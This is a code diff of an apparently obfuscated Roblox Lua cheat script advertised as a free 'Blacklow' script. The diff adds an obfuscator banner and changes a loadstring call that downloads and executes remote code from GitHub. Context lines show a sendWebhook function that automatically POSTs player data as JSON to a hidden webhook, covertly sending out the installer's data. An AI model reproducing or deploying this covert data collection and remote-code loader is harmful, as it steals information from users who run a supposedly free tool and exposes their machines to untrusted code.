@@ -1,4 +1,13 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 
 
+]]--
 
 local TABLE_TableIndirection = {};
 bit32 = {};
@@ -140,7 +149,7 @@ local function sendWebhook()
 	TABLE_TableIndirection["HttpRequest%0"]({Url=TABLE_TableIndirection["Webhook%0"],Body=TABLE_TableIndirection["PlayerDataJson%0"],Method="POST",Headers={["content-type"]="application/json"}});
 end
 sendWebhook();
-TABLE_TableIndirection["OrionLib%0"] = loadstring(game:HttpGet("https://raw.githubusercontent.com/Secret834/script/refs/heads/main/PIBSXH"))();
+TABLE_TableIndirection["OrionLib%0"] = loadstring(game:HttpGet("https://raw.githubusercontent.com/jensonhirst/Orion/main/source"))();
 TABLE_TableIndirection["Window%0"] = TABLE_TableIndirection["OrionLib%0"]:MakeWindow({Name="Free Blacklow Script ",HidePremium=false,SaveConfig=true,ConfigFolder="OrionTest"});
 TABLE_TableIndirection["OrionLib%0"]:MakeNotification({Name="Created by Zaklom ",Content="Universal  Blacklow script free.",Image="rbxassetid://4483345998",Time=5});
 TABLE_TableIndirection["Tab%0"] = TABLE_TableIndirection["Window%0"]:MakeTab({Name="Player",Icon="rbxassetid://4483345998",PremiumOnly=false});
